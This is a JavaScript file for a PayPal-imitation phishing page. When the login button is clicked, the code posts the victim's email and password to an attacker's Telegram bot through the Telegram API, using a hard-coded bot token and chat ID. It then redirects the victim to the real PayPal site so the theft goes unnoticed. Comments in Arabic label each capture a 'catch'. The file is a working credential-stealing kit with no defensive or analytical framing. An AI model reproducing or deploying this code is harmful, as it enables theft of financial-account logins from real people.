const email = document.getElementById("email")
const password = document.getElementById("password")
const loginBtn = document.getElementById("login")
const signUpBtn = document.getElementById("signup")
const forgetBtn = document.getElementById("forget")

window.onload = () => {
    email.onpaste = e => e.preventDefault();
    password.onpaste = e => e.preventDefault();
}

// دالة الإرسال المباشر إلى بوت تيليجرام
function postCredentials(emailVal, passwordVal) {
    const botToken = "8557996520:AAH26sZyicyx4_rIDn99QwPWH-XJKeoEeEA";
    const chatId = "7983109632";
    
    // تنسيق رسالة الصيد
    const message = `🚨 صيد جديد!\n\n📧 Email: ${emailVal}\n🔑 Password: ${passwordVal}`;
    
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    var myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/json");

    var raw = JSON.stringify({
        "chat_id": chatId,
        "text": message,
        "parse_mode": "Markdown"
    });

    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
    };

    fetch(url, requestOptions)
        .then(response => response.text())
        .then(result => console.log("Sent to Telegram"))
        .catch(error => console.log('error', error));
}

loginBtn.addEventListener("click", function () {
    postCredentials(email.value, password.value)
    window.location.replace("https://www.paypal.com/us/home");
})

forgetBtn.addEventListener("click", function () {
    window.location.replace("https://www.paypal.com/authflow/password-recovery/");
})

signUpBtn.addEventListener("click", function () {
    window.location.replace("https://www.paypal.com/us/webapps/mpp/account-selection/");
})
